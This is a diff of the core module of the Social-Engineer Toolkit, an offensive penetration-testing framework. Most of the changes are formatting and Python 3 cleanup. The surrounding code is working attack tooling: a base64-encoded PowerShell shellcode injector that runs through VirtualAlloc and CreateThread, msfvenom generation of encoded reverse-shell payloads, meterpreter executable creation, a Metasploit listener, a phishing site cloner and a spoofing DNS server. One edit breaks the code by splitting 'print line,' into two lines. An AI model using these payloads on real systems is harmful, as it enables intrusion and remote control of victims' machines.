@@ -2,33 +2,35 @@
 ##############################################
 #    Centralized core modules for SET        #
 ##############################################
+import traceback
 import re
 import sys
 import socket
 import subprocess
 import shutil
 import os
-import time
 import datetime
 import random
 import string
 import inspect
 import base64
-from src.core import dictionaries
 import io
-import trace
+from time import sleep
+from src.core import dictionaries
 
+# Python 3 removes reduce from builtin and into functools
 if sys.version_info >= (3, 0):
-    # python 3 removes reduce from builtin and into functools
     from functools import *
 
 # needed for backwards compatibility of python2 vs 3 - need to convert to threading eventually
-try: import thread
-except ImportError: import _thread as thread
+try:
+    import thread
+except ImportError:
+    import _thread as thread
 
 try:
     raw_input
-except:
+except NameError:
     raw_input = input
 
 # check to see if we have python-pycrypto
@@ -36,9 +38,10 @@ try:
     from Crypto.Cipher import AES
 
 except ImportError:
-
-    print("[!] The python-pycrypto python module not installed. You will lose the ability for encrypted communications.")
+    print(
+        "[!] The python-pycrypto python module not installed. You will lose the ability for encrypted communications.")
     pass
+
 
 # get the main SET path
 def definepath():
@@ -51,15 +54,15 @@ def definepath():
     else:
         return os.getcwd()
 
+
 # check operating system
-
-
 def check_os():
     if os.name == "nt":
         operating_system = "windows"
     if os.name == "posix":
         operating_system = "posix"
     return operating_system
+
 
 #
 # Class for colors
@@ -147,6 +150,7 @@ else:
             self.backWhite = ''
             self.DARKCYAN = ''
 
+
 # this will be the home for the set menus
 
 
@@ -202,6 +206,7 @@ def return_continue():
            "<return> " + bcolors.ENDC + "to continue"))
     pause = raw_input()
 
+
 ############ DEBUGGING ###############
 # ALWAYS SET TO ZERO BEFORE COMMIT!
 DEBUG_LEVEL = 0
@@ -234,6 +239,7 @@ def mod_name():
     calling_module = inspect.getmodulename(frame_records[1])
     return calling_module
 
+
 ##########################################
 ############ RUNTIME MESSAGES ############
 
@@ -263,8 +269,8 @@ def get_version():
     define_version = '7.0.2'
     return define_version
 
-class create_menu:
 
+class create_menu:
     def __init__(self, text, menu):
         self.text = text
         self.menu = menu
@@ -301,18 +307,18 @@ def validate_ip(address):
     except socket.error:
         return False
 
+
 #
 # grab the metaspoit path
 #
 
 
 def meta_path():
-
     # DEFINE METASPLOIT PATH
     trigger = 0
     try:
 
-                # specific for backbox linux
+        # specific for backbox linux
         if os.path.isfile("/opt/metasploit-framework/msfconsole"):
             msf_path = "/opt/metasploit-framework/"
             trigger = 1
@@ -380,6 +386,7 @@ def meta_path():
         msf_path = False
     return msf_path
 
+
 #
 # grab the metaspoit path
 #
@@ -425,13 +432,13 @@ def grab_ipaddress():
                             break
                     return rhost
 
-        # if AUTO_DETECT=OFF prompt for IP Address
+                    # if AUTO_DETECT=OFF prompt for IP Address
             match1 = re.search("AUTO_DETECT=OFF", line)
             if match1:
                 rhost = raw_input(
                     setprompt("0", "IP address for the payload listener (LHOST)"))
                 while 1:
-                        # check if IP address is valid
+                    # check if IP address is valid
                     ip_check = is_valid_ip(rhost)
                     if ip_check == False:
                         rhost = raw_input("[!] Invalid ip address try again: ")
@@ -470,6 +477,7 @@ def cleanup_routine():
     except:
         pass
 
+
 #
 # Update The Social-Engineer Toolkit
 #
@@ -484,13 +492,11 @@ def update_set():
             "You are running BackBox Linux which already implements SET updates.")
         print_status(
             "No need for further operations, just update your system.")
-        time.sleep(2)
+        sleep(2)
 
     elif kali == "Kali":
         print_status("You are running Kali Linux which maintains SET updates.")
-        print_status("You can enable bleeding-edge repos for up-to-date SET.")
-        time.sleep(2)
-        bleeding_edge()
+        sleep(2)
 
     # if we aren't running Kali or BackBox :(
     else:
@@ -501,7 +507,8 @@ def update_set():
         print_info("Updating... This could take a little bit...")
         subprocess.Popen("git pull", shell=True).wait()
         print_status("The updating has finished, returning to main menu..")
-        time.sleep(2)
+        sleep(2)
+
 
 #
 # Pull the help menu here
@@ -528,6 +535,7 @@ def date_time():
     now = str(datetime.datetime.today())
     return now
 
+
 #
 # generate a random string
 #
@@ -537,6 +545,7 @@ def generate_random_string(low, high):
     length = random.randint(low, high)
     letters = string.ascii_letters + string.digits
     return ''.join([random.choice(letters) for _ in range(length)])
+
 
 #
 # clone JUST a website, and export it.
@@ -575,7 +584,9 @@ def site_cloner(website, exportpath, *args):
     # copy the file to a new folder
     print_status("Site has been successfully cloned and is: " + exportpath)
     subprocess.Popen("mkdir '%s';cp %s/web_clone/* '%s'" % (exportpath, setdir,
-                                                            exportpath), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
+                                                            exportpath), stdout=subprocess.PIPE, stderr=subprocess.PIPE,
+                     shell=True).wait()
+
 
 #
 # this will generate a meterpreter reverse payload (executable)
@@ -588,7 +599,6 @@ def site_cloner(website, exportpath, *args):
 
 
 def meterpreter_reverse_tcp_exe(port):
-
     ipaddr = grab_ipaddress()
     filewrite = open(setdir + "/interface", "w")
     filewrite.write(ipaddr)
@@ -618,6 +628,8 @@ def meterpreter_reverse_tcp_exe(port):
     print_status("Executable created under %s/%s.exe" % (setdir, random_value))
     subprocess.Popen("cp %s/msf.exe %s/%s.exe" % (setdir, setdir, random_value),
                      stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
+
+
 #
 # Start a metasploit multi handler
 #
@@ -634,6 +646,7 @@ def metasploit_listener_start(payload, port):
     metasploit_path = meta_path()
     subprocess.Popen("%s/msfconsole -r %s/msf_answerfile" %
                      (metasploit_path, setdir), shell=True).wait()
+
 
 #
 # This will start a web server in the directory root you specify, so for example
@@ -652,6 +665,7 @@ def start_web_server(directory):
 
         class ReusableTCPServer(socketserver.TCPServer):
             allow_reuse_address = True
+
         # specify the httpd service on 0.0.0.0 (all interfaces) on port 80
         httpd = ReusableTCPServer(
             ("0.0.0.0", 80), http.server.SimpleHTTPRequestHandler)
@@ -663,6 +677,7 @@ def start_web_server(directory):
     except KeyboardInterrupt:
         print_info("Exiting the SET web server...")
         httpd.socket.close()
+
 
 #
 # this will start a web server without threads
@@ -681,6 +696,7 @@ def start_web_server_unthreaded(directory):
 
         class ReusableTCPServer(socketserver.TCPServer):
             allow_reuse_address = True
+
         # specify the httpd service on 0.0.0.0 (all interfaces) on port 80
         httpd = ReusableTCPServer(
             ("0.0.0.0", 80), http.server.SimpleHTTPRequestHandler)
@@ -711,7 +727,6 @@ def java_applet_attack(website, port, directory):
     # one
     filename = check_options("MSF.EXE=")
     if check_options != 0:
-
         # move the file to the specified directory and filename
         subprocess.Popen("cp %s/msf.exe %s/%s" % (setdir, directory, filename),
                          stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
@@ -731,6 +746,7 @@ def java_applet_attack(website, port, directory):
     print_info("Starting the multi/handler through Metasploit...")
     metasploit_listener_start("windows/meterpreter/reverse_tcp", port)
 
+
 #
 # this will create a raw PDE file for you to use in your teensy device
 #
@@ -738,7 +754,6 @@ def java_applet_attack(website, port, directory):
 
 
 def teensy_pde_generator(attack_method):
-
     # grab the ipaddress
     ipaddr = grab_ipaddress()
 
@@ -799,6 +814,8 @@ def teensy_pde_generator(attack_method):
             "Successfully generated Teensy HID Attack Vector under %s/reports/binary2teensy.pde" % (setdir))
 
     print_status(teensy_string)
+
+
 #
 # Expand the filesystem windows directory
 #
@@ -806,6 +823,7 @@ def teensy_pde_generator(attack_method):
 
 def windows_root():
     return os.environ['WINDIR']
+
 
 #
 # core log file routine for SET
@@ -832,6 +850,8 @@ def log(error):
             filewrite.close()
     except IOError as err:
         pass
+
+
 #
 # upx encoding and modify binary
 #
@@ -877,11 +897,10 @@ def upx(path_to_file):
         # copy the file over
         subprocess.Popen("mv %s/temp.binary %s" % (setdir, path_to_file),
                          stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
-    time.sleep(3)
+    sleep(3)
 
 
 def show_banner(define_version, graphic):
-
     if graphic == "1":
         if check_os() == "posix":
             os.system("clear")
@@ -1088,6 +1107,7 @@ def show_graphic():
                  ``:::::::::::::::::::''
                       ``:::::::::''""" + bcolors.ENDC)
 
+
 #
 # identify if set interactive shells are disabled
 #
@@ -1105,21 +1125,20 @@ def set_check():
         if match1:
             return False
 
+
 # if the user specifies 99
-
-
 def menu_back():
     print_info("Returning to the previous menu...")
 
+
 # used to generate random templates for the phishing schema
-
-
 def custom_template():
     try:
-        print ("         [****]  Custom Template Generator [****]\n")
-        print ("Always looking for new templates! In the set/src/templates directory send an email\nto info@trustedsec.com if you got a good template!")
+        print("         [****]  Custom Template Generator [****]\n")
+        print(
+            "Always looking for new templates! In the set/src/templates directory send an email\nto info@trustedsec.com if you got a good template!")
         author = raw_input(setprompt("0", "Enter the name of the author"))
-        filename = randomgen = random.randrange(1, 99999999999999999999)
+        filename = random.randrange(1, 99999999999999999999)
         filename = str(filename) + (".template")
         subject = raw_input(setprompt("0", "Enter the subject of the email"))
         try:
@@ -1151,7 +1170,7 @@ def check_length(choice, max):
     while 1:
         if counter == 1:
             choice = raw_input(bcolors.YELLOW + bcolors.BOLD +
-                           "[!] " + bcolors.ENDC + "Invalid choice try again: ")
+                               "[!] " + bcolors.ENDC + "Invalid choice try again: ")
         # try block in case its not a integer
         try:
             # check to see if its an integer
@@ -1167,11 +1186,13 @@ def check_length(choice, max):
         except Exception:
             counter = 1
 
+
 # valid if IP address is legit
 
 
 def is_valid_ip(ip):
     return is_valid_ipv4(ip) or is_valid_ipv6(ip)
+
 
 # ipv4
 
@@ -1212,6 +1233,7 @@ def is_valid_ipv4(ip):
         $
     """, re.VERBOSE | re.IGNORECASE)
     return pattern.match(ip) is not None
+
 
 # ipv6
 
@@ -1278,6 +1300,7 @@ def check_config(param):
                 line = line.split("=")
                 return line[1]
 
+
 # copy an entire folder function
 
 
@@ -1308,7 +1331,7 @@ def copyfolder(sourcePath, destPath):
 
 # this routine will be used to check config options within the set.options
 def check_options(option):
-        # open the directory
+    # open the directory
     trigger = 0
     fileopen = open(setdir + "/set.options", "r").readlines()
     for line in fileopen:
@@ -1322,11 +1345,12 @@ def check_options(option):
     if trigger == 0:
         return trigger
 
+
 # future home to update one localized set configuration file
 
 
 def update_options(option):
-        # if the file isn't there write a blank file
+    # if the file isn't there write a blank file
     if not os.path.isfile(setdir + "/set.options"):
         filewrite = open(setdir + "/set.options", "w")
         filewrite.write("")
@@ -1345,12 +1369,13 @@ def update_options(option):
     filewrite.write(old_options + "\n" + option + "\n")
     filewrite.close()
 
+
 # python socket listener
 
 
 def socket_listener(port):
-    port = int(port)          # needed integer for port
-    host = ''                 # Symbolic name meaning the local host
+    port = int(port)  # needed integer for port
+    host = ''  # Symbolic name meaning the local host
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     # set is so that when we cancel out we can reuse port
     s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
@@ -1373,11 +1398,11 @@ def socket_listener(port):
         print(data)
     conn.close()
 
+
 # generates powershell payload
 
 
 def generate_powershell_alphanumeric_payload(payload, ipaddr, port, payload2):
-
     # generate our shellcode first
     shellcode = metasploit_shellcode(payload, ipaddr, port)
     try:
@@ -1412,27 +1437,30 @@ def generate_powershell_alphanumeric_payload(payload, ipaddr, port, payload2):
     # we don't have to guess if its x64 or x86 and what type of shellcode to
     # use
     powershell_command = (
-        r"""$1 = '$c = ''[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = %s;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};';$e = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($1));$2 = "-enc ";if([IntPtr]::Size -eq 8){$3 = $env:SystemRoot + "\syswow64\WindowsPowerShell\v1.0\powershell";iex "& $3 $2 $e"}else{;iex "& powershell $2 $e";}""" % (shellcode))
+        r"""$1 = '$c = ''[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = %s;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};';$e = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($1));$2 = "-enc ";if([IntPtr]::Size -eq 8){$3 = $env:SystemRoot + "\syswow64\WindowsPowerShell\v1.0\powershell";iex "& $3 $2 $e"}else{;iex "& powershell $2 $e";}""" % (
+            shellcode))
 
     # unicode and base64 encode and return it
     return base64.b64encode(powershell_command.encode('utf_16_le'))
 
+
 # generate base shellcode
 def generate_shellcode(payload, ipaddr, port):
-
     msf_path = meta_path()
     # generate payload
     port = port.replace("LPORT=", "")
-    proc = subprocess.Popen("%smsfvenom -p %s LHOST=%s LPORT=%s StagerURILength=5 StagerVerifySSLCert=false -e x86/shikata_ga_nai -a x86 --platform windows --smallest -f c" %
-                            (msf_path, payload, ipaddr, port), stdout=subprocess.PIPE, shell=True)
+    proc = subprocess.Popen(
+        "%smsfvenom -p %s LHOST=%s LPORT=%s StagerURILength=5 StagerVerifySSLCert=false -e x86/shikata_ga_nai -a x86 --platform windows --smallest -f c" %
+        (msf_path, payload, ipaddr, port), stdout=subprocess.PIPE, shell=True)
     data = proc.communicate()[0]
     data = data.decode('ascii')
     # start to format this a bit to get it ready
-    #repls = {';': '', ' ': '', '+': '', '"': '', '\n': '',
+    # repls = {';': '', ' ': '', '+': '', '"': '', '\n': '',
     #         'unsigned char buf=': '', 'unsignedcharbuf[]=': ''}
     repls = [';', ' ', '+', '"', '\n', 'unsigned char buf=', 'unsignedcharbuf[]=', "b'", "'", '\\n']
     for repl in repls: data = data.replace(repl, "")
     return data
+
 
 # this will take input for shellcode and do a replace for IP addresses
 def shellcode_replace(ipaddr, port, shellcode):
@@ -1497,6 +1525,7 @@ def shellcode_replace(ipaddr, port, shellcode):
     # return shellcode
     return shellcode
 
+
 # exit routine
 def exit_set():
     cleanup_routine()
@@ -1541,10 +1570,10 @@ def metasploit_shellcode(payload, ipaddr, port):
 
     return shellcode
 
+
 # here we encrypt via aes, will return encrypted string based on secret
 # key which is random
 def encryptAES(secret, data):
-
     # the character used for padding--with a block cipher such as AES, the value
     # you encrypt must be a multiple of BLOCK_SIZE in length.  This character is
     # used to ensure that your value is always a multiple of BLOCK_SIZE
@@ -1568,6 +1597,7 @@ def encryptAES(secret, data):
     aes = EncodeAES(cipher, data)
     return str(aes)
 
+
 # compare ports to make sure its not already in a config file for metasploit
 
 
@@ -1580,17 +1610,15 @@ def check_ports(filename, port):
     else:
         return False
 
-# main dns class
-
 
 class DNSQuery:
-
+    """ Main DNS Class """
     def __init__(self, data):
         self.data = data
         self.dominio = ''
 
-        tipo = (ord(data[2]) >> 3) & 15   # Opcode bits
-        if tipo == 0:                     # Standard query
+        tipo = (ord(data[2]) >> 3) & 15  # Opcode bits
+        if tipo == 0:  # Standard query
             ini = 12
             lon = ord(data[ini])
             while lon != 0:
@@ -1603,7 +1631,7 @@ class DNSQuery:
         if self.dominio:
             packet += self.data[:2] + "\x81\x80"
             packet += self.data[4:6] + self.data[4:6] + \
-                '\x00\x00\x00\x00'   # Questions and Answers Counts
+                      '\x00\x00\x00\x00'  # Questions and Answers Counts
             # Original Domain Name Question
             packet += self.data[12:]
             # Pointer to domain name
@@ -1614,49 +1642,44 @@ class DNSQuery:
                                     for x in ip.split('.')])  # 4bytes of IP
         return packet
 
-# main dns routine
 
-
+# Main DNS routine
 def dns():
-    udps = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    udps.bind(('', 53))
     try:
+        udps = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        udps.bind(('', 53))
         while 1:
             data, addr = udps.recvfrom(1024)
             p = DNSQuery(data)
             udps.sendto(p.respuesta(ip), addr)
-
     except KeyboardInterrupt:
         print("Exiting the DNS Server..")
-        sys.exit()
         udps.close()
-
-# start dns
+        sys.exit()
 
 
 def start_dns():
     thread.start_new_thread(dns, ())
 
-# the main ~./set path for SET
 
-
+# The main ~./set path for SET
 def setdir():
     if check_os() == "posix":
         return os.path.join(os.path.expanduser('~'), '.set')
     if check_os() == "windows":
         return "src/program_junk/"
+
+
 # set the main directory for SET
 setdir = setdir()
+
 
 # Copyright (c) 2007 Brandon Sterne
 # Licensed under the MIT license.
 # http://brandon.sternefamily.net/files/mit-license.txt
 # CIDR Block Converter - 2007
-
 # convert an IP address from its dotted-quad format to its
 # 32 binary digit representation
-
-
 def ip2bin(ip):
     b = ""
     inQuads = ip.split(".")
@@ -1670,10 +1693,9 @@ def ip2bin(ip):
         outQuads -= 1
     return b
 
+
 # convert a decimal number to binary representation
 # if d is specified, left-pad the binary number with 0s to that length
-
-
 def dec2bin(n, d=None):
     s = ""
     while n > 0:
@@ -1689,18 +1711,16 @@ def dec2bin(n, d=None):
         s = "0"
     return s
 
+
 # convert a binary string into an IP address
-
-
 def bin2ip(b):
     ip = ""
     for i in range(0, len(b), 8):
         ip += str(int(b[i:i + 8], 2)) + "."
     return ip[:-1]
 
+
 # print a list of IP addresses based on the CIDR block specified
-
-
 def printCIDR(c):
     parts = c.split("/")
     baseIP = ip2bin(parts[0])
@@ -1714,17 +1734,16 @@ def printCIDR(c):
     else:
         ipPrefix = baseIP[:-(32 - subnet)]
         breakdown = ''
-        for i in range(2**(32 - subnet)):
+        for i in range(2 ** (32 - subnet)):
             ipaddr = bin2ip(ipPrefix + dec2bin(i, (32 - subnet)))
             ip_check = is_valid_ip(ipaddr)
             if ip_check != False:
-                    # return str(ipaddr)
+                # return str(ipaddr)
                 breakdown = breakdown + str(ipaddr) + ","
         return breakdown
 
+
 # input validation routine for the CIDR block specified
-
-
 def validateCIDRBlock(b):
     # appropriate format for CIDR block ($prefix/$subnet)
     p = re.compile("^([0-9]{1,3}\.){0,3}[0-9]{1,3}(/[0-9]{1,2}){1}$")
@@ -1745,12 +1764,10 @@ def validateCIDRBlock(b):
     # passed all checks -> return True
     return True
 
+
 # Queries a remote host on UDP:1434 and returns MSSQL running port
 # Written by Larry Spohn (spoonman) @ TrustedSec
-
-
 def get_sql_port(host):
-
     # Build the socket with a .1 second timeout
     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     s.settimeout(.1)
@@ -1768,9 +1785,8 @@ def get_sql_port(host):
     except:
         pass
 
+
 # capture output from a function
-
-
 def capture(func, *args, **kwargs):
     """Capture the output of func when called with the given arguments.
 
@@ -1789,9 +1805,8 @@ def capture(func, *args, **kwargs):
     sys.stderr = stderr
     return (result, c1.getvalue(), c2.getvalue())
 
+
 # check to see if we are running backbox linux
-
-
 def check_backbox():
     if os.path.isfile("/etc/issue"):
         backbox = open("/etc/issue", "r")
@@ -1805,9 +1820,8 @@ def check_backbox():
         print("[!] Not running a Debian variant..")
         return "Non-BackBox"
 
+
 # check to see if we are running kali linux
-
-
 def check_kali():
     if os.path.isfile("/etc/apt/sources.list"):
         kali = open("/etc/apt/sources.list", "r")
@@ -1821,46 +1835,9 @@ def check_kali():
         print("[!] Not running a Debian variant..")
         return "Non-Kali"
 
-# checking if we have bleeding-edge enabled for updates
-
-
-def bleeding_edge():
-    bleeding = check_config("BLEEDING_EDGE=").lower()
-    if bleeding == "on":
-            # first check if we are actually using Kali
-        kali = check_kali()
-        if kali == "Kali":
-            print_status("Checking to see if bleeding-edge repos are active.")
-            # check if we have the repos enabled first
-            if os.path.isfile("/etc/apt/sources.list.d/bleeding.list"):
-                print_status("Bleeding edge already active..Moving on..")
-                return True
-            else:
-                print_warning(
-                    "Bleeding edge repos were not detected. Use at your own risk!")
-                enable = raw_input(
-                    "Do you want to enable bleeding-edge repos for fast updates [yes/no]: ")
-                if enable == "y" or enable == "yes":
-                    print_status(
-                        "Adding Kali bleeding edge to sources.list for updates.")
-                    # we need to add repo to a new sources file
-                    filewrite = open("/etc/apt/sources.list.d/bleeding.list", "w")
-                    filewrite.write("# kali repos installed by SET\ndeb http://http.kali.org kali-bleeding-edge main contrib non-free")
-                    filewrite.close()
-                    print_status("It is recommended that you run apt-get update && apt-get upgrade && apt-get dist-upgrade, then apt-get -t install -t kali-bleeding-edge set framework3")
-                    return True
-                else:
-                    print(
-                        "[:(] Your loss! Bleeding edge provides updates regularly to Metasploit, SET, and others!")
-
-        else:
-            print("[*] Kali Linux was not detected, moving on...")
 
 # here we give multiple options to specify for SET java applet
-
-
 def applet_choice():
-
     # prompt here
     print("""
 [-------------------------------------------]
@@ -1900,17 +1877,20 @@ Select which option you want:
         except:
             module_reload(src.html.unsigned.verified_sign)
 
+
 # reload module function for python 2 and python 3
 def module_reload(module):
-    if sys.version_info >= (3,0):
+    if sys.version_info >= (3, 0):
         import importlib
         importlib.reload(module)
     else:
         module_reload(module)
 
+
 # used to replace any input that we have from python 2 to python 3
 def input(string):
-	return raw_input(string)
+    return raw_input(string)
+
 
 # fetch URL needed for web cloning
 def fetch_template():
@@ -1926,7 +1906,7 @@ def fetch_template():
 # tail a file
 def tail(filename):
     if os.path.isfile(filename):
-        file = open(filename,'r')
+        file = open(filename, 'r')
         st_results = os.stat(filename)
         st_size = st_results[6]
         file.seek(st_size)
@@ -1935,9 +1915,11 @@ def tail(filename):
             where = file.tell()
             line = file.readline()
             if not line:
-                time.sleep(1)
+                sleep(1)
                 file.seek(where)
             else:
-                print line, # already has newline
+                print
+                line,  # already has newline
 
-    else: print_error("File not found, cannot tail.")
+    else:
+        print_error("File not found, cannot tail.")
